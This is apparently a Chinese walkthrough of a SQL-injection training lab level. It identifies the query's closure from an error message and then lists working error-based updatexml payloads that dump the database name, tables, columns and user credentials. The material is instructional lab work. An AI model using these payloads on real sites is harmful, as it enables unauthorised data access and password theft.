# 确认闭合状态
输入：passwd=1&submit=Submit&uname=1  
无回显

输入：passwd=1'&submit=Submit&uname=1  
显示报错信息：near ''1'') LIMIT 0,1' at line 1

说明本关是一个单引号加一个括号的闭合方式

输入：passwd=1') or 1=1 --+submit=Submit&uname=1  
成功，但没有任何回显，那么可以考虑报错注入


payload参考第5关
# 查询数据库名
passwd=1') and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+&submit=Submit&uname=1

# 查询表名
passwd=1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+&submit=Submit&uname=1


# 查询列名
passwd=1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e),1)--+&submit=Submit&uname=1


# 查询值
passwd=1') and updatexml(1,concat(0x7e,substring((select group_concat(username,':',password) from users),1,10),0x7e),1)--+&submit=Submit&uname=1

passwd=1') and updatexml(1,concat(0x7e,substring((select group_concat(username,':',password) from users),11,10),0x7e),1)--+&submit=Submit&uname=1

passwd=1') and updatexml(1,concat(0x7e,substring((select group_concat(username,':',password) from users),21,10),0x7e),1)--+&submit=Submit&uname=1

...